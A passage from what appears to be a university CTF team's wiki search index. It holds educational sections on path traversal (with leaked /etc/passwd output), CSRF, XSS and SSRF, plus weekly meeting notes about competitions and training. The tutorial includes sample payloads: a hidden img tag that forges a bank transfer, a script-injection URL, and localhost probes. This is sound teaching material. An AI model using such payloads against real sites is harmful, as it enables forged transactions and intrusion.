Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n_apt:x:104:65534::/nonexistent:/bin/false\n</code></pre> <p>This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.</p>"},{"location":"CTF/Web/#cross-site-request-forgery-csrf","title":"Cross-Site Request Forgery (CSRF)","text":"<p>A Cross-Site Request Forgery or CSRF Attack pronounced see the surf, is an attack on an authenticated user which uses a state session in order to perform state-changing attacks like a purchase, a transfer of funds, or a change of email address.</p> <p>The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through a <code>&lt;img&gt;</code> tag or a <code>&lt;iframe&gt;</code> where references to external resources are unverified.</p>"},{"location":"CTF/Web/#using-csrf","title":"Using CSRF","text":"<p><code>GET</code> requests are often used by websites to get user input. Say a user signs in to a banking site that assigns their browser a cookie that keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern:</p> <pre><code>http://securibank.com/transfer.do?acct=[RECEPIENT]&amp;amount=[DOLLARS]\n</code></pre> <p>Knowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as:</p> <p><code>&lt;img src=\"http://securibank.com/transfer.do?acct=[RECEPIENT]&amp;amount=[DOLLARS]\" width=\"0\" height=\"0\" border=\"0\"&gt;</code></p>"},{"location":"CTF/Web/#cross-site-scripting-xss","title":"Cross-Site Scripting (XSS)","text":"<p>Cross-Site Scripting or XSS is a vulnerability where one user of an application can send JavaScript that is executed by the browser of another user of the same application.</p> <p>This is a vulnerability because JavaScript has a high degree of control over a user's web browser.</p> <p>For example, JavaScript has the ability to:</p> <ul> <li>Modify the page (called the DOM)</li> <li>Send more HTTP requests</li> <li>Access cookies</li> </ul> <p>By combining all of these abilities, XSS can maliciously use JavaScript to extract users' cookies and send them to an attacker-controlled server. XSS can also modify the DOM to phishing users for their passwords. This only scratches the surface of what XSS can be used to do.</p> <p>XSS is typically broken down into three categories:</p> <ul> <li>Reflected XSS</li> <li>Stored XSS</li> <li>DOM XSS</li> </ul>"},{"location":"CTF/Web/#reflected-xss","title":"Reflected XSS","text":"<p>Reflected XSS is when an XSS exploit is provided through a URL parameter.</p> <p>For example:</p> <pre><code>https://ctf101.org?data=&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>You can see the XSS exploit provided in the <code>data</code> GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM.</p> <p>For example:</p> <pre><code>&lt;html&gt;\n    &lt;body&gt;\n        &lt;script&gt;alert(1)&lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Depending on where the exploit gets injected, it may need to be constructed differently.</p> <p>Also, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit them to an external server, or to simply modify the page to deface it.</p> <p>One of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker-controlled resource. Notice that if the data parameter, wasn't provided the exploit wouldn't work.</p> <p>In many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicious XSS payloads in URLs.</p>"},{"location":"CTF/Web/#stored-xss","title":"Stored XSS","text":"<p>Stored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself.</p> <p>Imagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS.</p> <p>The reason is that the website itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user.</p>"},{"location":"CTF/Web/#dom-xss","title":"DOM XSS","text":"<p>DOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client-side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger.</p> <p>The server itself is not to blame, but the client-side JavaScript files are causing the issue.</p>"},{"location":"CTF/Web/#server-side-request-forgery-ssrf","title":"Server Side Request Forgery (SSRF)","text":"<p>Server Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines.</p> <p>For example, say there is a website that lets you take a screenshot of any site on the internet.</p> <p>Under normal usage, a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost? Or perhaps tries to access something more useful like http://localhost/server-status?</p> <p>127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers.</p> <p>Depending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself.</p> <p>In addition, the requests originating from the server would come from the server's IP, not the attacker's IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access.</p> <p>Another usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/","title":"CTF Week Meeting 2023-01-12","text":"<p>We are happy that we are here in 2023 and thank all members for their efforts in the past year. In the first (actually the second) all-volunteer weekly meeting this year, we will summarize the work and achievements of last year and designate the annual plan for 2023.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 60%</li> <li>Topic: CTF combined with research - 0% brief idea</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>~~COMPASS TEAM's public email - 100% done~~</li> <li>Training plan during winter break - 0%</li> <li>Member adjustment - 25%</li> <li>New Platform GZCTF - 43%</li> <li>Wiki page content adjustment - 20% brief idea</li> <li>CTFtime program: go hard and play CTF - 0% brief idea</li> <li>New Member Recruitment - 0% brief idea</li> <li>Apply for more ports with ITS on the Detroit server - 50%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Weekly meeting restructuring</li> <li>Wiki page file structure revision</li> <li>The 2022 year in Review</li> <li>The 2023 year plan</li> <li>Intra-team practice games and upcoming matches</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#0x1-weekly-meeting-restructuring","title":"0x1. Weekly meeting restructuring","text":"<p>Perhaps you have noticed that in this weekly meeting, I have restructured the weekly meeting. Based on the results of the previous questionnaire collection, I got some valuable suggestions about the weekly meetings.</p> <p>In the future, I will still use Markdown to design the document, compared to Latex, although Latex has a better presentation, Markdown saves a lot of time in writing the document, and our time is too precious to waste in compiling and adjusting the document, and I will not use PPT for the weekly meeting. The document for the weekly meeting will follow the following format.</p> <ol> <li> <p>Work tracking: Many plans that were once confidently ready to be implemented were not completed due to a lack of progress tracking. In future meetings, I will add a progress tracking section to report on the progress of the work.</p> </li> <li> <p>This week's content discussion: Keeping the style of the previous weekly meeting, I will list the discussion items for this week's weekly meeting, and hope to describe the details of each plan and item in detail while synchronizing the content follow-up. This is the discussion session, I hope everyone can actively give suggestions on the plans and matters, more discussion often means better results.</p> </li> <li> <p>Wrap-up (Summary): A final summary of the content of this week's weekly meeting. If you do not have time to attend the weekly meeting discussion and do not intend to read the lengthy details of the discussion items after the weekly meeting, you can quickly follow up on the progress of this week's weekly meeting discussion through the outline and summary of the content discussion.</p> </li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#0x2-wiki-page-file-structure-revision","title":"0x2. Wiki page file structure revision","text":"<p>I have restructured some of the documents, and the main elements include.</p> <ol> <li> <p>archived the CS315 file for 2021 and placed it in the 2021 folder.</p> </li> <li> <p>filed the weekly meeting documents for 2022, divided them into two parts, the first half and the second half, and placed them in different folders.</p> </li> </ol> <p>In addition, some work was done on resizing the images. Git is not a supported binary versioning tool (unlike SVN), our repo is on GitHub, and I am not a paid member of GitHub, so although there is no repository size limit for the free version, I still want to reduce the size of our binary files to reduce the size of our repository I'm not a paid member of GitHub either.</p> <p>The initial work was to resize all the image files to a fraction of their original size and try not to compromise image quality.</p> <p></p> <p>I hope you can pay attention to the following conventions when submitting a Pull Request.</p> <ol> <li> <p>All material files (images, attachments, etc.) should be placed under the assets/ folder as much as possible.</p> </li> <li> <p>For uncompressed high-quality images (such as direct screenshots or downloaded originals), please include the <code>_hd</code> field after the image name so that I can find the image that needs to be compressed when adjusting it.</p> </li> </ol> <p>Future work related to the wiki.</p> <ol> <li> <p>adjust the bilingual language support: Mkdocs natively support multi-language localization, we only used English as a language when creating the wiki, as a first/second language that almost global users know, I considered the convenience. However, our first language is Chinese, and reading English documents is much slower than Chinese documents, I will consider adding Chinese support.</p> <ul> <li>Current planned solution: access to DeepL's API to generate a Chinese translation directly. As the Chinese with higher tolerance rate, the level of comprehension through English to Chinese translation will be better.</li> </ul> </li> <li> <p>adjust the content structure: wiki content structure today as a CTF all-in-one reference wiki, but there are still many shortcomings. I hope that while providing toolkits, web resource references, and writeups, more categories can be added to facilitate CTF learning.</p> </li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#0x3-the-2022-year-in-review","title":"0x3. The 2022 Year in Review","text":"<p>We have achieved some results in FY2022, but we also have some unfinished business.</p> <p>Memorable accomplishments.</p> <ol> <li> <p>We participated in the \"Top Geeks\" competition held by the Chengdu government and came in 10th place in the finals.</p> </li> <li> <p>We participated in the \"Wangding Cup\" competition held by the National Internet Information Office and the Ministry of Public Security, and got 8th place in the preliminary round and advanced to the final round.</p> </li> <li> <p>The HED team won 1st place in the \"Winter Competition\" of iChunqiu.</p> </li> <li> <p>We participated in the \"Student Cyber Security Competition\" held by Guangdong Provincial Government and advanced to the final round.</p> </li> <li> <p>In the CTFtime 2022 ranking, the COMPASS team achieved a total score of 83.569, ranking 32nd among Chinese teams.</p> </li> <li> <p>We participated in the \"Strong Network Cup\" competition held by the State Internet Information Office and the Zhengzhou government, and both teams got the \"Strong Network Pioneer\" certificate.</p> </li> </ol> <p>Unfortunately, in 2022, we also have some matters that were once planned to go down the drain and remain unfinished. To review our 2022 objectively and fairly, I would like to summarize this part as well.</p> <ol> <li> <p>CTF from practice to principles: I was inspired by Prof. Zhang in early 2022 to compile a book about CTF tutorials for true zero-based CTF beginners to make up for the shortcomings of today's CTF tutorial books that are still too difficult and the knowledge coverage fails to construct a big picture of CTF and network security. Unfortunately, so far I have only completed the outline and part of the first chapter of the book, and I hope to continue this work in 2023.</p> </li> <li> <p>Competition planning for new members: This is one of the main tasks of the varsity team, and despite our intensive weekly training, the number of members participating in competitions is still very insufficient. In the weekly meetings, I synchronize the competitions that will be held soon, but few new members intend to participate.</p> </li> <li> <p>Adjustment of the tournament platform: Unfortunately, although I had planned to adjust the topics and functions of the CTFd platform being used and made some rough proposals, this plan did not come to fruition in the end. After testing the new platform on 2023-01-07, I decided to use GZCTF as our new platform and abandon the original CTFd platform. I will transfer our original questions, entry test questions, and other high-quality tournament questions to GZCTF.</p> </li> <li> <p>Cooperation with the Information Center: At the beginning of the establishment of the varsity team, I communicated quite closely with a colleague from the Information Center ITS, would participate in each other's activities, and achieved some results in the construction of the network security. Unfortunately, after several lengthy and boring communications, annoying network problems, and a change in the attitude of the Information Center towards cyber security, ITS did not participate in many of the subsequent events we held. I regret that COMPASS TEAM's attempts to work with the Information Center to improve campus cybersecurity have largely failed, but I will still try to convince ITS to pursue this effort.</p> </li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#0x4-the-2023-year-plan","title":"0x4. The 2023 year plan","text":"<p>We've reached 2023, and in a brand new year, it's time to make a new annual plan.</p> <ol> <li> <p>CTFtime race plan: In the new year, I will try not to miss any race that has a CTFtime rating, to raise the visibility of COMPASS TEAM on the biggest international platform in the CTF field, and to move towards DEF CON 31 in August.</p> </li> <li> <p>Membership recruitment: We were very lucky to have two extremely talented new members of the class of 2022 join us before we even started our membership recruitment. In 2023, I will adjust the membership recruitment schedule and invite the best members to join us.</p> </li> <li> <p>Cross-platform science and awareness promotion: I am planning to create COMPASS TEAM social media accounts on multiple platforms, and I have chosen different content strategies for each different platform user group. Social media platforms are a great way to get the word out about our work, and those currently planned include.</p> <ul> <li> <p>CSDN/Blog Garden: Reprint wiki content</p> </li> <li> <p>WeChat Public: Vulnerability analysis and summary</p> </li> <li> <p>Pediy (Kanxue) Forum: vulnerability recurrence and research</p> </li> <li> <p>Anquanke: technical summaries and tutorials</p> </li> <li> <p>Tiktok: Network Security Tips</p> </li> <li> <p>Twitter: publicity/results sharing</p> </li> <li> <p>Weibo: Activity dynamics and science popularization</p> </li> <li> <p>Zhihu account: writeup analysis</p> </li> <li> <p>Bilibili account: CTF science and teaching</p> </li> <li> <p>52pojie forum: Reverse engineering technologies sharing.</p> </li> </ul> </li> <li> <p>CTF and research content combination: I always aspire to publish academic results, and it is fun to share my brand-new work contribution with others. Before that, I had only done a small amount of scientific work and still knew very little about how to publish a paper. Recently I've been talking with Hongyi Lu about trying to combine CTF content with academic papers. Much of what we are exposed to in CTF (especially in cryptography) seems to be very cutting edge, and I used to think that CTF is not accurate to just reproduce what has already been done. I hope to publish some work in 2023 as I explore the feasibility of combining CTF with research.</p> </li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#0x5-intra-team-practice-games-and-upcoming-matches","title":"0x5. Intra-team practice games and upcoming matches","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#on-campus-practice-x-mas-ctf-2022-repeat","title":"On-Campus Practice: X-MAS CTF 2022 Repeat","text":"<p>Between 2023-01-07 and 2023-01-08, we had an intramural practice session to test the new GZCTF platform, which gave me a very good experience using the platform and confirmed the idea of replacing CTFd with GZCTF.</p> <p></p> <p></p> <p>The beta version of the platform is currently open on port 29998 of the Detroit server. When I finish the container revision and title migration work, I will close the CTFd service on port 80 and move GZCTF to port 80. Meanwhile, the GZCTF data of the test period will be retained.</p> <p>A fresh start is the best start, I tend to clear the original user data to start from scratch and build a new and better platform. However, if you wish to keep your former account and keep your former solution records, I will also keep the data for you.</p> <p>For data preservation and migration, please contact email: liz33@mail.sustech.edu.cn, when you send it, you can copy it to Prof. Fengwei Zhang in COMPASS lab: zhangfw@sustech.edu.cn, I will finish the platform migration as soon as possible.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#idekctf-2022","title":"idekCTF 2022*","text":"<p>Friday, 13 January 2023, 08:00 CST - Sunday, 15 January 2023, 08:00 CST</p> <p>A idekCTF event.</p> <p>Official URL: https://ctf.idek.team/</p> <p>Rating weight: 24.56</p> <p>Event organizers</p> <ul> <li>idek</li> </ul> <p>NOTE: The start time has been pushed back by 22 hours from what is listed here. The event will begin on Friday, January 13, 2023, at 22:00:00 UTC (1673647200). The event duration is still 48 hours.</p> <p>idekCTF is an information security CTF competition organized by the idek team and is aimed at high school and university students, with difficult challenges catering to more experienced players. idekCTF will cover the standard Jeopardy-style CTF topics (binary exploitation, reverse engineering, cryptography, web exploitation, and forensics) as well as other, less standard categories.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#ugra-ctf-quals-2023","title":"Ugra CTF Quals 2023","text":"<p>Saturday, 14 January 2023, 15:00 CST - Monday, 16 January 2023, 03:00 CST</p> <p>A Ugra CTF event.</p> <p>Official URL: https://2023.ugractf.ru/</p> <p>Rating weight: 0.00</p> <p>Event organizers</p> <ul> <li>[team Team]</li> </ul> <p>Ugra CTF Quals 2023 is an open information security competition for beginners. It is a 36-hour online event. Everybody is welcome to participate.</p> <p>This CTF is organized by [team Team] in a joint effort with the Ugra Research Institute of Information Technologies and Information Technologies and Digital Development Department of the Khanty-Mansiysk Autonomous Okrug \u2014 Ugra.</p> <p>Teams of high school students and others are playing in separate scoreboards, but they will be merged upon uploading to CTFtime.</p> <p>Note: This year's challenges will be a bit easier than usual. If you enjoyed our previous years' Quals, come and join us at Ugra CTF Open 2023 which will be held June 2023.</p> <p>The official language of Ugra CTF is Russian, but you are welcome to participate even if you don\u2019t speak it. We will try our best to ensure that no task relies on something that can\u2019t be understood by proper use of machine translation.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-12/#wrap-up","title":"Wrap-up","text":"<p>In this week's weekly meeting, we adjusted the format and content format of the weekly meeting conducted after the day to facilitate work progress tracking and planning. I proposed a new planned content adjustment of the Wiki page, hoping to make the Wiki content more suitable for CTF beginners and players' reference.</p> <p>In addition, we have reviewed the achievements of the 2022 varsity team, and also summarized the regrets and unfinished business of 2022, hoping to inspire us to continue our progress. At the same time, I have prepared many new plans for 2023.</p> <p>The work on the new platform has been in the planning since the second half of 2022, from trying to adjust the CTFd, and gradually changing to the new platform GZCTF was chosen. In the test conducted last week, the stability and usability of GZCTF were tested, and I plan to change the tournament platform to GZCTF.</p> <p>Finally, about the recent tournament matters. There will be two competitions this week, both of which are international competitions of CTFtime, and the idekCTF of which has CTFtime score weighting, so I hope students who can learn will participate.</p> <p>The above is the content of this week's weekly meeting, if you have any comments/suggestions, please feel free to contact me.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/","title":"CTF Week Meeting 2023-01-19","text":"<p>Happy New Year in advance to all of you! This is our last weekly meeting before the Spring Festival, and after the Spring Festival, we will start our plans and goals for the new year, so I hope we can still make progress together and build on our success.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 60%</li> <li>Topic: CTF combined with research - 0%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>Training plan during winter break - 33%</li> <li>Member adjustment - 50%</li> <li>New Platform GZCTF - 43%</li> <li>Wiki page content adjustment - 20%</li> <li>CTFtime program: play CTF and sharing - 0%</li> <li>New Member Recruitment - 0%</li> <li>Apply for more ports with ITS on the Detroit server - 33%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Member adjustment.</li> <li>Training plan during winter break.</li> <li>Apply for more ports with ITS on the Detroit server.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#0x1-member-adjustment","title":"0x1. Member adjustment","text":"<p>So far I have collected most of the questionnaire results from the members, with a total of 16 results from new members. Some of them are collected for the training of the last semester, and the other part is the comments and suggestions for the shortcomings of the previous training.</p> <p>For training participation, 50% of the members almost always/always participate in the weekly training program and 87.5% of the members would participate in the weekly training program, recommendations regarding training participation I will list later.</p> <p>Competition participation was unfortunate, with 18.8% of members participating in 3-5 competitions, while 62.5% of members participated in only 1-2 competitions. I encourage students to participate in more competitions, and I will follow your suggestions to improve the notification and participation format of the competitions.</p> <p>The day-to-day work of the varsity team includes the maintenance of the wiki page, the updating of the tournament question platform, and the future posting of content to our social media accounts, which is difficult for me to do alone and therefore requires help. Happily, 81.3% of the members are willing to assist with this part of the work.</p> <p>Regarding COMPASS lab, 56.2% of the members would like to participate in COMPASS lab research, choose COMPASS colleagues as mentors, or actively prepare to stay in COMPASS as graduate students. COMPASS is a very good environment and platform, and I hope that you would like to choose COMPASS as your future plan.</p> <p>Unfortunately, after a semester of working together, three members decided to retire, either choosing to continue their studies in other directions or finding that CTF did not fit their future plans. I would also like to wish the members who chose to retire a bright future.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#advice","title":"Advice","text":"<p>The training model in question. There are some very good suggestions under this issue, and I will combine the training content explanation with the topics in future training, starting from the perspective of sharing the topics and introducing what should be explained here.</p> <p>About the contest. I have matched teams according to everyone's intentions, and before the tournament, I would suggest participating through teams, even if you can only make one or two questions, you are contributing to this tournament all the same. In the tournament suggestions, I would make it a little easier to form teams.</p> <p>In the future, I will also pay attention to everyone's class schedule and CTF time. I will increase the frequency of activities when people are not too busy, and try not to take up too much time during the midterm and final periods.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#teams","title":"Teams","text":"<p>I try to make sure the team has no more than five players (four + substitutes) so that it can meet the number requirements for most tournaments. For tournaments with a ten-player limit, it is possible to combine two teams for the tournament.</p> <p>Due to such considerations, some students' team intentions were not met, so if you have any questions about team arrangements or are very interested in joining a particular team, you can also contact me and I will rearrange it.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#0x2-training-plan-during-winter-break","title":"0x2. Training plan during winter break","text":"<p>The tournament schedule for the winter break will be synced on my Google calendar and also made public each week in the group for the week. If it is a contest that requires advance registration for team formation, I will synchronize it higher. For the rest of January, here is the schedule of competitions, which students are free to choose their own time to participate in.</p> Competition Name Link Start Time End Time Require pre-register Insomni'hack teaser 2023 https://insomnihack.ch/contests/ 2023-1-20 20:00 2023-1-22 20:00 False KnightCTF 2023 https://knightctf.com/ 2023-1-20 23:00 2023-1-21 23:00 False bi0sCTF 2022 https://ctf.bi0s.in/ 2023-1-21 23:00 2023-1-22 23:00 False \u897f\u6e56\u8bba\u5251\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b-\u521d\u8d5b https://game.gcsis.cn/ 2023-2-02 00:00 2023-2-02 23:59 True <p>For members participating in the competition I suggest posting a link to your team invitation and a link to the competition in the group so that students who are also planning to join the competition can join the team more easily.</p> <p>In addition, there will be some basic content recording training to catch up on the basics of network security. These trainings will not take place at a fixed time, and most of them will be recorded. If it is an online meeting or a live broadcast, the corresponding recording will also be kept.</p> <p>The specific content selection I will complete in the near future and will be released on public channels as soon as possible.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#0x3-apply-for-more-ports-with-its-on-the-detroit-server","title":"0x3. Apply for more ports with ITS on the Detroit server","text":"<p>Two weeks ago, I submitted an OA request form to open all ports above 20,000 on the detroit server to accommodate the new GZCTF platform. The new platform assigns ports rather randomly, and the container assignment dependency library it uses does not have the ability to set port ranges, so if you want to limit the ports assigned to 20000-30000, you will need to make some ugly network level changes, which I prefer not to do.</p> <p>Besides, the originally requested 20,000-30,000 ports are getting stretched and may not meet our service needs in the future, requesting more ports is one solution (another solution is for me to open the docker containers on a public container hosting platform).</p> <p>After two long weeks of waiting, the OA file was marked as processed, but the ports were not open. ITS believes that requesting more than 30,000 ports will still require a new security scan and check, and intends to follow up with me via email (which I have not received so far).</p> <p>The migration of the GZCTF platform has been affected somewhat, and if the ports are not open, then the dynamic and static container features of GZCTF will not be available off-campus, and I will not be able to run practice rounds on GZCTF (as all topics using containers will not work).</p> <p>Suffice it to say that the GZCTF migration progress is being blocked by the progress of the ITS application.</p> <p>I will continue to follow up on the progress of the port application and hope to finish it as soon as possible.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#0x4-upcoming-events","title":"0x4. Upcoming events","text":"<p>It has been listed above and will not be repeated.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-01-19/#wrap-up","title":"Wrap-up","text":"<p>The restructuring of new members and team assignments are almost complete, and I have taken some good advice and made adjustments to future plans.</p> <p>The tournament schedule will make it as easy as possible for students to form teams and hopefully participate in more tournaments. I have listed the recent tournament schedule and the rest of the winter break plans are being designed and will be made public in a few days.</p> <p>The migration of the GZCTF platform has been delayed by the slow progress of ITS, which I am following up on.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/","title":"CTF Week Meeting 2023-02-02","text":"<p>After the end of the Spring Festival, I am working on the work matters planned for the year before, and we are also participating in the West Lake Sword Tournament today, so I wish you all continue to move forward in the next semester.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 60%</li> <li>Topic: CTF combined with research - 0%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>Training plan during winter break - 100%</li> <li>Member adjustment - 100%</li> <li>New Platform GZCTF - 43%</li> <li>Wiki page content adjustment - 20%</li> <li>CTFtime program: play CTF and sharing - 9%</li> <li>New Member Recruitment - 0%</li> <li>Apply for more ports with ITS on the Detroit server - 100%</li> <li>Ande Cup CTF game - 13% brief idea</li> <li>Remedial content session - 0% brief idea</li> <li>2023 spring training schedule - 33% brief idea</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Ande Cup (\u5b89\u5fb7\u676f) CTF game.</li> <li>Remedial content session.</li> <li>2023 spring training schedule.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#0x1-ande-cup-ctf-game","title":"0x1. Ande Cup (\u5b89\u5fb7\u676f) CTF game","text":"<p>Just a game.</p> <p>Inspired by an entertainment contest mentioned in a chat, I am working on the content design and topic design, about 20 questions or so, there will be some simple promotion in QQ group/CTFtime, not a serious cyber security RW vulnerability contest, but entertainment for beginners.</p> <p>The contest is tentatively scheduled for Feb 26 - Feb 27, 2023, and will last for 24 hours.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#0x2-remedial-content-session","title":"0x2. Remedial content session","text":"<p>In these tutorials, I will sync the written content to our wiki for use as an introduction to cybersecurity, currently selected content is</p> <ul> <li>What is cybersecurity and the hacker attitude.</li> <li>Installation and basic operation of Linux-based operating systems.</li> <li>Simple programming using the Python language, including math, networking, and image processing.</li> <li>How to use Sagemath to perform mathematical operations.</li> <li>Network packet capture and analysis via Burp Suite or Fiddler.</li> <li>Understanding file structure and using a hex editor.</li> <li>Reverse executables such as ELF and PE via IDA or Ghidra.</li> <li>Basic content and exploitation of binary vulnerabilities.</li> <li>Creating containers with Docker and container management with K8S.</li> </ul> <p>This content will be updated gradually in the form of written materials or video images and will not be available in offline training sessions.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#0x3-2023-spring-training-schedule","title":"0x3. 2023 spring training schedule","text":"<p>For the spring 2023 program, we will continue to use the same weekly training format as before, and we will accept your suggestions to add a sharing and combination of questions to the training and add more practical content in addition to theory.</p> <p>Each week, I will also post an archived replay of a recent competition, or a self-practice session on a selected topic, which you are free to arrange according to your schedule. Of course, if there is a competition planned for the week, the competition topic review will be delayed/reduced/canceled.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#spring-2023-program","title":"Spring 2023 Program","text":"<p>In the spring 2023 program, we have two components: recruitment of new members and advanced training. After a semester of competition and training, everyone's cybersecurity level and ability have improved, and I will focus on deepening learning in a certain direction this semester.</p> <p>I will not recruit too many new members this semester, and the final recruitment will still be conducted through the competition, mainly for the freshmen of 2022, and the number of recruits will be mainly used to make up for the number of members who will graduate after this semester.</p> <p>The number of recruits will be used to make up for the number of members who will graduate after this semester. The spring 2023 offline training and competition questions will be updated on this page.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#0x4-upcoming-events","title":"0x4. Upcoming events.","text":"<p>I have updated the tournament calendar for February and here are the tournaments that will take place this week.</p> Competition Name Link Start Time End Time Require pre-register \u897f\u6e56\u8bba\u5251\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b-\u521d\u8d5b https://game.gcsis.cn/ 2023-02-02 10:00 2023-02-02 18:00 True/End Byte Bandits CTF 2023 BB CTF 2023-02-04 14:30 2023-02-05 14:30 False DiceCTF 2023 DiceCTF 2023 2023-02-04 05:00 2023-02-06 05:00 False <p>I'm going to participate in competitions. For the team invite links, feel free to pm me or ask a question in the WeChat Group.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-02/#wrap-up","title":"Wrap-up","text":"<p>We planned an upcoming recreational game and summarized what had been accomplished. Three new upcoming programs have been filed in the minutes of this weekly meeting.</p> <p>The remedial training materials for the basic content will be refined and released in the near future, including a series of training programs for spring 2023 with a replay of the race in question, which will also be updated in real-time.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-09/","title":"CTF Week Meeting 2023-02-09","text":"<p>We finished 87th in the Xihulunjian tournament, 1 challenge away from 60th place, so we are not in the final. We will still continue to compete in tournaments, and our first practice after the school year starts is February 19.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-09/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>COMPASS CTF 2022 - 60%</li> <li>Topic: CTF combined with research - 0%</li> <li>Multi-platform promotion of COMPASS CTF - 20%</li> <li>New Platform GZCTF - 43%</li> <li>Wiki page content adjustment - 20%</li> <li>CTFtime program: play CTF and sharing - 11%</li> <li>New Member Recruitment - 0%</li> <li>Ande Cup CTF game - 13%</li> <li>Remedial content session - 0%</li> <li>2023 spring training schedule - 33%</li> <li>Xihulunjian reproduction environment - 33%</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-09/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Xihulunjian reproduction environment.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-09/#0x1-xihulunjian-reproduction-environment","title":"0x1. Xihulunjian reproduction environment","text":"<p>The reproduction environment is being built, and various materials including attachments, descriptions and writeups have been collected to complete the topics that can be reproduced. The container environment will be on the new platform of GZCTF, and after the completion of this reproduction, the old platform will be gradually transferred, and the topics will be replaced by the new platform after the migration is completed.</p> <p>At present, GZCTF is open on port 29998 and has confirmed that the high-end port is open and can be used for testing and topic implementation.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-02-09/#0x2-upcoming-events","title":"0x2. Upcoming events","text":"<p>I have updated the tournament calendar for February and here are the tournaments that will take place this week.</p> Competition Name Link Start Time End Time Require pre-register HSCSEC CTF 2023 https://race.hscsec.cn/ 2023-02-11 00:00 2023-02-13 00:00 False LA CTF 2023 https://lactf.uclaacm.com/ 2023-02-11 12:00 2023-02-13 06:00 False MHSCTF 2023 https://mhsctf2023.ctfd.io/ 2023-02-02 01:00 